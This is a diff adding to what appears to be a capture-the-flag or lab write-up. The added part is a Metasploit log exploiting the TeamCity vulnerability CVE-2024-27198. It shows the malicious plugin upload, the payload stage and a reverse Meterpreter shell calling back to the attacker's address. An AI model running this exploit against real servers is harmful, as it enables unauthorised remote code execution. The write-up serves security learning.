@@ -53,3 +53,23 @@ there is one login page on port `50000`
 
 ![](../../../assets/images/Pasted%20image%2020251101170127.png)
 ![](../../../assets/images/Pasted%20image%2020251101170143.png)
+
+```bash
+[msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> set LHOST 10.8.31.47
+LHOST => 10.8.31.47
+[msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> exploit 
+[*] Started reverse TCP handler on 10.8.31.47:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
+[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.ZmR4bUVYVzdQLVdJLUo4MHVGS0hYbmdUSllz.NmE3ZGY0MzItMTk4Yi00Y2VjLWEwODgtYmFiMDE1MGNiMzQ3
+[*] Uploading plugin: m7WplZt9
+[*] Sending stage (58073 bytes) to 10.201.125.63
+[*] Deleting the plugin...
+[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_m7WplZt9
+[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/m7WplZt9
+[*] Meterpreter session 1 opened (10.8.31.47:4444 -> 10.201.125.63:54264) at 2025-11-01 11:40:06 +0000
+[*] Deleting the authentication token...
+[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/m7WplZt9' on the target
+```
+
+we got shell
